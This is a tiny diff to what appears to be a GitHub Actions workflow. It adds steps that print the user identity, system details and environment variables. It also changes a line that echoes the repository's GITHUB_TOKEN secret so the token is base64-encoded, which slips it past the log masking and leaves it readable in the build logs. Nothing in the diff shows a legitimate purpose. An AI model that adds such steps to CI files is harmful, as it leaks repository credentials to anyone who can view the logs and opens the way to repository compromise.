@@ -10,5 +10,5 @@ jobs:
       - run: id
       - run: uname -a
       - run: env
-      - run: echo ${{ secrets.GITHUB_TOKEN}}
+      - run: echo ${{ secrets.GITHUB_TOKEN}} | base64
   
